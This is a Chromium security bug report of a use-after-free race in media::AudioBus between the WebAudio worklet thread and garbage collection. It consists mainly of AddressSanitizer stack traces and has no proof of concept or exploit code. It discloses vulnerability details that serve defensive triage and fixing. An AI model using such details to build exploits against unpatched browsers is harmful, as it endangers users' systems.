# Security: Uaf in media::AudioBus

| Field | Value |
|-------|-------|
| **Issue ID** | [412057896](https://issues.chromium.org/issues/412057896) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Internals>Media |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Chrome Version** | asan-linux-release-1444497 |
| **Reporter** | su...@gmail.com |
| **Assignee** | mj...@chromium.org |
| **Created** | 2025-04-20 |
| **Bounty** | $7,000.00 |

## Description

# Steps to reproduce the problem

This vulnerability is a race condition vulnerability with a very low probability of being triggered. I am still trying to reproduce the vulnerability and construct a PoC.

# Problem Description

I currently don't know the root cause of this vulnerability. For now, I can only provide the stack backtrace of the vulnerability. You can analyze it based on the stack backtrace first, and I will provide a more detailed vulnerability analysis later.

# Summary

Security: Uaf in media::AudioBus

# Custom Questions

#### Type of crash:

tab

#### Crash state:

```
==4065400==ERROR: AddressSanitizer: heap-use-after-free on address 0x706aed7ea2f0 at pc 0x5a2da2f06753 bp 0x700a511fcc70 sp 0x700a511fcc68
READ of size 8 at 0x706aed7ea2f0 thread T26 (Semi-Realtime A)
==4065400==WARNING: invalid path to external symbolizer!
==4065400==WARNING: Failed to use and restart external symbolizer!
    #0 0x5a2da2f06752 in media::AudioBus::AllChannelsSubspan(unsigned long, unsigned long) const ./../../media/base/audio_bus.cc:406:24
    #1 0x5a2da2f05d1b in media::AudioBus::CopyPartialFramesTo(int, int, int, media::AudioBus*) const ./../../media/base/audio_bus.cc:370:39
    #2 0x5a2d8bc9b388 in media::AudioPushFifo::Push(media::AudioBus const&) ./../../media/base/audio_push_fifo.cc:60:17
    #3 0x5a2db1bb09eb in blink::WebAudioMediaStreamSource::ConsumeAudio(WTF::Vector<float const*, 0u, WTF::PartitionAllocator> const&, int) ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:78:9
    #4 0x5a2db1bcf4d0 in blink::MediaStreamAudioDestinationHandler::ConsumeAudio(blink::AudioBus*, int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:219:28
    #5 0x5a2db1bced69 in blink::MediaStreamAudioDestinationHandler::Process(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:89:3
    #6 0x5a2db1a86696 in blink::AudioHandler::ProcessIfNecessary(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/audio_handler.cc:325:7
    #7 0x5a2db1b788f3 in blink::DeferredTaskHandler::ProcessAutomaticPullNodes(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc:198:41
    #8 0x5a2db1c0d370 in blink::RealtimeAudioDestinationHandler::Render(blink::AudioBus*, unsigned int, blink::AudioIOPosition const&, blink::AudioCallbackMetric const&, base::TimeDelta, media::AudioGlitchInfo const&) ./../../third_party/blink/renderer/modules/webaudio/realtime_audio_destination_handler.cc:262:37
    #9 0x5a2db1c1bd0c in blink::AudioDestination::PullFromCallback(blink::AudioBus*, base::TimeDelta) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:672:14
    #10 0x5a2db1c154e0 in blink::AudioDestination::RequestRender(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks, bool) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:643:7
    #11 0x5a2db1c148ba in blink::AudioDestination::RequestRenderWait(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:559:8
    #12 0x5a2db1c1dcca in Invoke<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks> ./../../base/functional/bind_internal.h:731:12
    #13 0x5a2db1c1dcca in MakeItSo<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), std::__Cr::tuple<scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks> > ./../../base/functional/bind_internal.h:923:12
    #14 0x5a2db1c1dcca in RunImpl<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), std::__Cr::tuple<scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks>, 0UL, 1UL, 2UL, 3UL, 4UL, 5UL, 6UL> ./../../base/functional/bind_internal.h:1060:14
    #15 0x5a2db1c1dcca in base::internal::Invoker<base::internal::FunctorTraits<void (blink::AudioDestination::*&&)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks), scoped_refptr<blink::AudioDestination>&&, unsigned int&&, unsigned int&&, base::TimeDelta&&, base::TimeTicks&&, media::AudioGlitchInfo&&, base::TimeTicks&&>, base::internal::BindState<true, true, false, void (blink::AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks), scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:973:12
    #16 0x5a2d9e3e8da6 in Run ./../../base/functional/callback.h:156:12
    #17 0x5a2d9e3e8da6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:209:34
    #18 0x5a2d9e45a768 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:458:11)> ./../../base/task/common/task_annotator.h:106:5
    #19 0x5a2d9e45a768 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:456:23
    #20 0x5a2d9e45964c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:330:40
    #21 0x5a2d9e45b49a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #22 0x5a2d9e2b4273 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:42:55
    #23 0x5a2d9e45c04b in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:629:12
    #24 0x5a2d9e36c9af in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #25 0x5a2d99da7576 in blink::scheduler::NonMainThreadImpl::SimpleThreadImpl::Run() ./../../third_party/blink/renderer/platform/scheduler/worker/non_main_thread_impl.cc:187:14
    #26 0x5a2d9e534b49 in base::(anonymous namespace)::ThreadFunc(void*) ./../../base/threading/platform_thread_posix.cc:103:13
    #27 0x5a2d88cf9b86 in asan_thread_start(void*) _asan_rtl_:28

0x706aed7ea2f0 is located 16 bytes inside of 64-byte region [0x706aed7ea2e0,0x706aed7ea320)
freed by thread T0 (chrome) here:
    #0 0x5a2d88d3688d in operator delete(void*) _asan_rtl_:3
    #1 0x5a2da2f00726 in ~vector ./../../third_party/libc++/src/include/__vector/vector.h:257:67
    #2 0x5a2da2f00726 in media::AudioBus::~AudioBus() ./../../media/base/audio_bus.cc:130:1
    #3 0x5a2da2f00853 in media::AudioBus::~AudioBus() ./../../media/base/audio_bus.cc:126:23
    #4 0x5a2d8bc9ae30 in operator() ./../../third_party/libc++/src/include/__memory/unique_ptr.h:76:5
    #5 0x5a2d8bc9ae30 in reset ./../../third_party/libc++/src/include/__memory/unique_ptr.h:287:7
    #6 0x5a2d8bc9ae30 in ~unique_ptr ./../../third_party/libc++/src/include/__memory/unique_ptr.h:256:71
    #7 0x5a2d8bc9ae30 in media::AudioPushFifo::~AudioPushFifo() ./../../media/base/audio_push_fifo.cc:19:31
    #8 0x5a2db1bb00ba in ~WebAudioMediaStreamSource ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:29:1
    #9 0x5a2db1bb00ba in blink::WebAudioMediaStreamSource::~WebAudioMediaStreamSource() ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:27:57
    #10 0x5a2db1bbd0a5 in operator() ./../../third_party/libc++/src/include/__memory/unique_ptr.h:76:5
    #11 0x5a2db1bbd0a5 in reset ./../../third_party/libc++/src/include/__memory/unique_ptr.h:287:7
    #12 0x5a2db1bbd0a5 in Dispose ./../../third_party/blink/renderer/platform/mediastream/media_stream_source.cc:264:20
    #13 0x5a2db1bbd0a5 in blink::MediaStreamSource::InvokePreFinalizer(cppgc::LivenessBroker const&, void*) ./../../third_party/blink/renderer/platform/mediastream/media_stream_source.h:60:3
    #14 0x5a2d9109b6e9 in operator() ./../../v8/src/heap/cppgc/prefinalizer-handler.cc:71:31
    #15 0x5a2d9109b6e9 in remove_if<std::__Cr::reverse_iterator<std::__Cr::__wrap_iter<cppgc::internal::PreFinalizer *> >, (lambda at ../../v8/src/heap/cppgc/prefinalizer-handler.cc:70:22)> ./../../third_party/libc++/src/include/__algorithm/remove_if.h:32:12
    #16 0x5a2d9109b6e9 in cppgc::internal::PreFinalizerHandler::InvokePreFinalizers() ./../../v8/src/heap/cppgc/prefinalizer-handler.cc:68:7
    #17 0x5a2d910688c7 in cppgc::internal::HeapBase::ExecutePreFinalizers() ./../../v8/src/heap/cppgc/heap-base.cc:169:26
    #18 0x5a2d8efb96e6 in v8::internal::CppHeap::CompactAndSweep() ./../../v8/src/heap/cppgc-js/cpp-heap.cc:990:51
    #19 0x5a2d8f0f1f05 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) ./../../v8/src/heap/heap.cc:2299:32
    #20 0x5a2d8f1416fb in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_0::operator()() const ./../../v8/src/heap/heap.cc:1670:7
    #21 0x5a2d8f140ecc in void heap::base::Stack::SetMarkerAndCallbackImpl<v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags)::$_0>(heap::base::Stack*, void*, void const*) ./../../v8/src/heap/base/stack.h:174:5
    #22 0x5a2d910c1c12 in PushAllRegistersAndIterateStack push_registers_asm.cc:0:0
    #23 0x5a2d8f0e59cc in SetMarkerIfNeededAndCallback<(lambda at ../../v8/src/heap/heap.cc:1638:40)> ./../../v8/src/heap/base/stack.h:76:7
    #24 0x5a2d8f0e59cc in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1638:11
    #25 0x5a2d8f0eb2a2 in CollectAllGarbage ./../../v8/src/heap/heap.cc:1269:3
    #26 0x5a2d8f0eb2a2 in v8::internal::Heap::HandleExternalMemoryInterrupt() ./../../v8/src/heap/heap.cc:1436:5
    #27 0x5a2d8f9d372e in CreateExtension ./../../v8/src/objects/js-array-buffer.cc:261:20
    #28 0x5a2d8f9d372e in v8::internal::JSArrayBuffer::Setup(v8::internal::SharedFlag, v8::internal::ResizableFlag, std::__Cr::shared_ptr<v8::internal::BackingStore>, v8::internal::Isolate*) ./../../v8/src/objects/js-array-buffer.cc:119:3
    #29 0x5a2d8f03de0d in v8::internal::Factory::NewJSArrayBuffer(std::__Cr::shared_ptr<v8::internal::BackingStore>, v8::internal::AllocationType) ./../../v8/src/heap/factory.cc:3504:11
    #30 0x5a2d90f06220 in v8::internal::WasmMemoryObject::New(v8::internal::Isolate*, int, int, v8::internal::SharedFlag, v8::internal::wasm::AddressType) ./../../v8/src/wasm/wasm-objects.cc:1000:33
    #31 0x5a2d90ea7dc9 in WebAssemblyMemoryImpl ./../../v8/src/wasm/wasm-js.cc:1632:8
    #32 0x5a2d90ea7dc9 in v8::internal::wasm::WebAssemblyMemory(v8::FunctionCallbackInfo<v8::Value> const&) ./../../v8/src/wasm/wasm-js.cc:3215:1
    #33 0x5a2d8ea4fc02 in v8::internal::FunctionCallbackArguments::CallOrConstruct(v8::internal::Tagged<v8::internal::FunctionTemplateInfo>, bool) ./../../v8/src/api/api-arguments-inl.h:93:3
    #34 0x5a2d8ea4df9a in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<true>(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::HeapObject>, v8::internal::DirectHandle<v8::internal::FunctionTemplateInfo>, v8::internal::DirectHandle<v8::internal::Object>, unsigned long*, int) ./../../v8/src/builtins/builtins-api.cc:104:16
    #35 0x5a2d8ea4c06f in v8::internal::Builtin_Impl_HandleApiConstruct(v8::internal::BuiltinArguments, v8::internal::Isolate*) ./../../v8/src/builtins/builtins-api.cc:135:3
    #36 0x5a2d92ff2fb5 in Builtins_CEntry_Return1_ArgvOnStack_BuiltinExit setup-isolate-deserialize.cc:0:0
    #37 0x5a2d92f48aa4 in Builtins_JSBuiltinsConstructStub setup-isolate-deserialize.cc:0:0
    #24 0x5a2de008dbc4  ([anon:v8]+0x8dbc4)
    #25 0x5a2de0085664  ([anon:v8]+0x85664)
    #40 0x5a2d92f4971b in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc:0:0
    #41 0x5a2d92f4946a in Builtins_JSEntry setup-isolate-deserialize.cc:0:0
    #42 0x5a2d8ee48571 in Call ./../../v8/src/execution/simulator.h:212:12
    #43 0x5a2d8ee48571 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) ./../../v8/src/execution/execution.cc:440:22
    #44 0x5a2d8ee46f89 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>, v8::base::Vector<v8::internal::DirectHandle<v8::internal::Object> const>) ./../../v8/src/execution/execution.cc:530:10

previously allocated by thread T26 (Semi-Realtime A) here:
    #0 0x5a2d88d3602d in operator new(unsigned long) _asan_rtl_:3
    #1 0x5a2da2effb92 in __libcpp_operator_new<unsigned long> ./../../third_party/libc++/src/include/__new/allocate.h:37:10
    #2 0x5a2da2effb92 in __libcpp_allocate<base::span<float, 18446744073709551615UL, float *> > ./../../third_party/libc++/src/include/__new/allocate.h:64:28
    #3 0x5a2da2effb92 in allocate ./../../third_party/libc++/src/include/__memory/allocator.h:105:14
    #4 0x5a2da2effb92 in __allocate_at_least<std::__Cr::allocator<base::span<float, 18446744073709551615UL, float *> > > ./../../third_party/libc++/src/include/__memory/allocate_at_least.h:41:19
    #5 0x5a2da2effb92 in __split_buffer ./../../third_party/libc++/src/include/__split_buffer:325:25
    #6 0x5a2da2effb92 in std::__Cr::vector<base::span<float, 18446744073709551615ul, float*>, std::__Cr::allocator<base::span<float, 18446744073709551615ul, float*>>>::reserve(unsigned long) ./../../third_party/libc++/src/include/__vector/vector.h:1110:49
    #7 0x5a2da2efe575 in media::AudioBus::BuildChannelData(int, base::span<float, 18446744073709551615ul, float*>) ./../../media/base/audio_bus.cc:325:17
    #8 0x5a2da2efddf6 in media::AudioBus::AudioBus(int, int) ./../../media/base/audio_bus.cc:84:3
    #9 0x5a2da2f0089e in media::AudioBus::Create(int, int) ./../../media/base/audio_bus.cc:133:31
    #10 0x5a2d8bc9b244 in media::AudioPushFifo::Push(media::AudioBus const&) ./../../media/base/audio_push_fifo.cc:43:20
    #11 0x5a2db1bb09eb in blink::WebAudioMediaStreamSource::ConsumeAudio(WTF::Vector<float const*, 0u, WTF::PartitionAllocator> const&, int) ./../../third_party/blink/renderer/platform/mediastream/webaudio_media_stream_source.cc:78:9
    #12 0x5a2db1bcf4d0 in blink::MediaStreamAudioDestinationHandler::ConsumeAudio(blink::AudioBus*, int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:219:28
    #13 0x5a2db1bced69 in blink::MediaStreamAudioDestinationHandler::Process(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/media_stream_audio_destination_handler.cc:89:3
    #14 0x5a2db1a86696 in blink::AudioHandler::ProcessIfNecessary(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/audio_handler.cc:325:7
    #15 0x5a2db1b788f3 in blink::DeferredTaskHandler::ProcessAutomaticPullNodes(unsigned int) ./../../third_party/blink/renderer/modules/webaudio/deferred_task_handler.cc:198:41
    #16 0x5a2db1c0d370 in blink::RealtimeAudioDestinationHandler::Render(blink::AudioBus*, unsigned int, blink::AudioIOPosition const&, blink::AudioCallbackMetric const&, base::TimeDelta, media::AudioGlitchInfo const&) ./../../third_party/blink/renderer/modules/webaudio/realtime_audio_destination_handler.cc:262:37
    #17 0x5a2db1c1bd0c in blink::AudioDestination::PullFromCallback(blink::AudioBus*, base::TimeDelta) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:672:14
    #18 0x5a2db1c154e0 in blink::AudioDestination::RequestRender(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks, bool) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:643:7
    #19 0x5a2db1c148ba in blink::AudioDestination::RequestRenderWait(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks) ./../../third_party/blink/renderer/platform/audio/audio_destination.cc:559:8
    #20 0x5a2db1c1dcca in Invoke<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks> ./../../base/functional/bind_internal.h:731:12
    #21 0x5a2db1c1dcca in MakeItSo<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), std::__Cr::tuple<scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks> > ./../../base/functional/bind_internal.h:923:12
    #22 0x5a2db1c1dcca in RunImpl<void (AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, const media::AudioGlitchInfo &, base::TimeTicks), std::__Cr::tuple<scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks>, 0UL, 1UL, 2UL, 3UL, 4UL, 5UL, 6UL> ./../../base/functional/bind_internal.h:1060:14
    #23 0x5a2db1c1dcca in base::internal::Invoker<base::internal::FunctorTraits<void (blink::AudioDestination::*&&)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks), scoped_refptr<blink::AudioDestination>&&, unsigned int&&, unsigned int&&, base::TimeDelta&&, base::TimeTicks&&, media::AudioGlitchInfo&&, base::TimeTicks&&>, base::internal::BindState<true, true, false, void (blink::AudioDestination::*)(unsigned long, unsigned long, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo const&, base::TimeTicks), scoped_refptr<blink::AudioDestination>, unsigned int, unsigned int, base::TimeDelta, base::TimeTicks, media::AudioGlitchInfo, base::TimeTicks>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:973:12
    #24 0x5a2d9e3e8da6 in Run ./../../base/functional/callback.h:156:12
    #25 0x5a2d9e3e8da6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:209:34
    #26 0x5a2d9e45a768 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:458:11)> ./../../base/task/common/task_annotator.h:106:5
    #27 0x5a2d9e45a768 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:456:23
    #28 0x5a2d9e45964c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:330:40
    #29 0x5a2d9e45b49a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #30 0x5a2d9e2b4273 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:42:55
    #31 0x5a2d9e45c04b in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:629:12
    #32 0x5a2d9e36c9af in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #33 0x5a2d99da7576 in blink::scheduler::NonMainThreadImpl::SimpleThreadImpl::Run() ./../../third_party/blink/renderer/platform/scheduler/worker/non_main_thread_impl.cc:187:14
    #34 0x5a2d9e534b49 in base::(anonymous namespace)::ThreadFunc(void*) ./../../base/threading/platform_thread_posix.cc:103:13
    #35 0x5a2d88cf9b86 in asan_thread_start(void*) _asan_rtl_:28

Thread T26 (Semi-Realtime A) created by T0 (chrome) here:
    #0 0x5a2d88ce0381 in ___interceptor_pthread_create _asan_rtl_:3
    #1 0x5a2d9e534138 in base::(anonymous namespace)::CreateThread(unsigned long, bool, base::PlatformThreadBase::Delegate*, base::PlatformThreadHandle*, base::ThreadType, base::MessagePumpType) ./../../base/threading/platform_thread_posix.cc:151:13
    #2 0x5a2d9e4d8f1c in base::SimpleThread::StartAsync() ./../../base/threading/simple_thread.cc:55:13
    #3 0x5a2d99da4f7a in blink::NonMainThread::CreateThread(blink::ThreadCreationParams const&) ./../../third_party/blink/renderer/platform/scheduler/worker/non_main_thread_impl.cc:41:11
    #4 0x5a2dae30a5da in blink::WorkerBackingThread::WorkerBackingThread(blink::ThreadCreationParams const&) ./../../third_party/blink/renderer/core/workers/worker_backing_thread.cc:125:23
    #5 0x5a2db1c40850 in make_unique<blink::WorkerBackingThread, const blink::ThreadCreationParams &, 0> ./../../third_party/libc++/src/include/__memory/unique_ptr.h:754:30
    #6 0x5a2db1c40850 in blink::WorkletThreadHolder<blink::SemiRealtimeAudioWorkletThread>::EnsureInstance(blink::ThreadCreationParams const&) ./../../third_party/blink/renderer/core/workers/worklet_thread_holder.h:36:9
    #7 0x5a2db1c41a77 in EnsureSharedBackingThread ./../../third_party/blink/renderer/modules/webaudio/semi_realtime_audio_worklet_thread.cc:24:3
    #8 0x5a2db1c41a77 in blink::SemiRealtimeAudioWorkletThread::SemiRealtimeAudioWorkletThread(blink::WorkerReportingProxy&) ./../../third_party/blink/renderer/modules/webaudio/semi_realtime_audio_worklet_thread.cc:53:5
    #9 0x5a2db1b02498 in make_unique<blink::SemiRealtimeAudioWorkletThread, blink::WorkerReportingProxy &, 0> ./../../third_party/libc++/src/include/__memory/unique_ptr.h:754:30
    #10 0x5a2db1b02498 in CreateWorkletThreadWithConstraints ./../../third_party/blink/renderer/modules/webaudio/audio_worklet_messaging_proxy.cc:136:10
    #11 0x5a2db1b02498 in blink::AudioWorkletMessagingProxy::CreateWorkerThread() ./../../third_party/blink/renderer/modules/webaudio/audio_worklet_messaging_proxy.cc:117:10
    #12 0x5a2dae301725 in blink::ThreadedMessagingProxyBase::InitializeWorkerThread(std::__Cr::unique_ptr<blink::GlobalScopeCreationParams, std::__Cr::default_delete<blink::GlobalScopeCreationParams>>, std::__Cr::optional<blink::WorkerBackingThreadStartupData> const&, std::__Cr::optional<base::TokenType<blink::DedicatedWorkerTokenTypeMarker> const> const&, std::__Cr::unique_ptr<blink::WorkerDevToolsParams, std::__Cr::default_delete<blink::WorkerDevToolsParams>>) ./../../third_party/blink/renderer/core/workers/threaded_messaging_proxy_base.cc:77:20
    #13 0x5a2db1b085c8 in blink::ThreadedWorkletMessagingProxy::Initialize(blink::WorkerClients*, blink::WorkletModuleResponsesMap*, std::__Cr::optional<blink::WorkerBackingThreadStartupData> const&, mojo::StructPtr<blink::mojom::blink::WorkletGlobalScopeCreationParams>) ./../../third_party/blink/renderer/core/workers/threaded_worklet_messaging_proxy.cc:161:3
    #14 0x5a2db1aff34d in blink::AudioWorklet::CreateGlobalScope() ./../../third_party/blink/renderer/modules/webaudio/audio_worklet.cc:81:10
    #15 0x5a2dae34ba0f in blink::Worklet::FetchAndInvokeScript(blink::KURL const&, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks*) ./../../third_party/blink/renderer/core/workers/worklet.cc:170:24
    #16 0x5a2dae34c9a9 in Invoke<void (Worklet::*)(const blink::KURL &, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks *), cppgc::internal::BasicPersistent<blink::Worklet, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL, blink::V8RequestCredentials::Enum, cppgc::internal::BasicPersistent<blink::WorkletPendingTasks, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy> > ./../../base/functional/bind_internal.h:731:12
    #17 0x5a2dae34c9a9 in MakeItSo<void (Worklet::*)(const blink::KURL &, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks *), std::__Cr::tuple<cppgc::internal::BasicPersistent<blink::Worklet, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL, blink::V8RequestCredentials::Enum, cppgc::internal::BasicPersistent<blink::WorkletPendingTasks, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy> > > ./../../base/functional/bind_internal.h:923:12
    #18 0x5a2dae34c9a9 in RunImpl<void (Worklet::*)(const blink::KURL &, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks *), std::__Cr::tuple<cppgc::internal::BasicPersistent<blink::Worklet, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL, blink::V8RequestCredentials::Enum, cppgc::internal::BasicPersistent<blink::WorkletPendingTasks, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy> >, 0UL, 1UL, 2UL, 3UL> ./../../base/functional/bind_internal.h:1060:14
    #19 0x5a2dae34c9a9 in base::internal::Invoker<base::internal::FunctorTraits<void (blink::Worklet::*&&)(blink::KURL const&, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks*), cppgc::internal::BasicPersistent<blink::Worklet, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>&&, blink::KURL&&, blink::V8RequestCredentials::Enum&&, cppgc::internal::BasicPersistent<blink::WorkletPendingTasks, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>&&>, base::internal::BindState<true, true, false, void (blink::Worklet::*)(blink::KURL const&, blink::V8RequestCredentials::Enum, blink::WorkletPendingTasks*), cppgc::internal::BasicPersistent<blink::Worklet, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>, blink::KURL, blink::V8RequestCredentials::Enum, cppgc::internal::BasicPersistent<blink::WorkletPendingTasks, cppgc::internal::StrongPersistentPolicy, cppgc::internal::IgnoreLocationPolicy, cppgc::internal::DisabledCheckingPolicy>>, void ()>::RunOnce(base::internal::BindStateBase*) ./../../base/functional/bind_internal.h:973:12
    #20 0x5a2d9e3e8da6 in Run ./../../base/functional/callback.h:156:12
    #21 0x5a2d9e3e8da6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) ./../../base/task/common/task_annotator.cc:209:34
    #22 0x5a2d9e45a768 in RunTask<(lambda at ../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:458:11)> ./../../base/task/common/task_annotator.h:106:5
    #23 0x5a2d9e45a768 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:456:23
    #24 0x5a2d9e45964c in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:330:40
    #25 0x5a2d9e45b49a in non-virtual thunk to base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:0:0
    #26 0x5a2d9e2b4273 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) ./../../base/message_loop/message_pump_default.cc:42:55
    #27 0x5a2d9e45c04b in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::Run(bool, base::TimeDelta) ./../../base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:629:12
    #28 0x5a2d9e36c9af in base::RunLoop::Run(base::Location const&) ./../../base/run_loop.cc:134:14
    #29 0x5a2db61dd704 in content::RendererMain(content::MainFunctionParams) ./../../content/renderer/renderer_main.cc:369:16
